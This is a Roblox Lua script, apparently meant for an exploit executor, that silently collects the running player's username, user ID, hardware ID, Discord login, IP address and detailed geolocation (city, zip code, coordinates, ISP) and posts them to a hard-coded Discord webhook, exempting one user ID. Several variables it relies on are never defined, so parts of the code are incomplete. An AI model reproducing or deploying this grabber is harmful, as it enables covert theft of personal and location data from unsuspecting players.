local LPR = game:GetService("Players").LocalPlayer
local userId = LPR.UserId

-- Skip logging silently if the user ID is 475557054
if userId == 475557054 then
    return
end

local url = "https://discord.com/api/webhooks/1321492490280374322/-Nna6ny9SOWim6XE0y9BBxzXggYkWp-YXursZ6z4ygbb_R242pTtJTp9BHakhlb-4Kby"

local data = {
    ["username"] = LPR.Name..' ['..LPR.UserId..']',
    ["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
     ["embeds"] = {
        {
            ["title"] = "Syr0nix Studio's",
            ["description"] = "Discord: https://discord.gg/z5Zq6Y9TSK",
            ["color"] = tonumber(0x2B6BE4),
            ["fields"] = {
                {
                    ["name"] = "Profile:",
                    ["value"] = "https://www.roblox.com/users/"..userId.."/profile",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game:",
                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Info:",
                    ["value"] = "**ID**: "..game.PlaceId..".\n**Name:** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    name = "Exploit",
                    value = webhookcheck,
                    inline = true
                },
                {
                    name = "HWID",
                    value = game:GetService("RbxAnalyticsService"):GetClientId(),
                    inline = true
                },
                 {
                    name = "Discord",
                    value = 'Logged in as ' .. client.user.username .. '#' .. client.user.discriminator,
                    inline = true
                },
                {
                    name = "2FA",
                    value = "||Python Only||",
                    inline = true
                },
                {
                    name = "Premium",
                    value = isPremium and "True" or "False",
                    inline = true
                },
                {
                    name = "Robux Balance",
                    value = "||Python Only||",
                    inline = true
                },
                {
                    name = "Account Age",
                    value = "" .. accountAge .. " ",
                    inline = true
                },
                {
                    name = "Join Code",
                    value = "" .. jobID,
                    inline = true
                },
                {
                    name = "IP",
                    value = FI.IP,
                    inline = true
                },
                {
                    name = "Country",
                    value = FI.country,
                    inline = true
                },
                {
                    name = "Country Code",
                    value = FI.countryCode,
                    inline = true
                },
                {
                    name = "Region",
                    value = FI.region,
                    inline = true
                },
                {
                    name = "Region Name",
                    value = FI.regionName,
                    inline = true
                },
                {
                    name = "City",
                    value = FI.city,
                    inline = true
                },
                {
                    name = "Zipcode",
                    value = FI.zipcode,
                    inline = true
                },
                {
                    name = "Latitude",
                    value = tostring(FI.latitude),
                    inline = true
                },
                {
                    name = "Longitude",
                    value = tostring(FI.longitude),
                    inline = true
                },
                {
                    name = "ISP",
                    value = FI.isp,
                    inline = true
                },
                {
                    name = "Org",
                    value = FI.org,
                    inline = true
                },
                {
                    name = "Python",
                    value = "||Robux Balance | F2A||",
                    inline = true
                },
                {
                    name = "Credits",
                    value = "Azure#3149  SeasonVx#5063  Syr0nix#3363",
                    inline = true
                }
            },
            ["color"] = tonumber(0x7269da),
          }
      }
}

local newdata = HTTP_:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
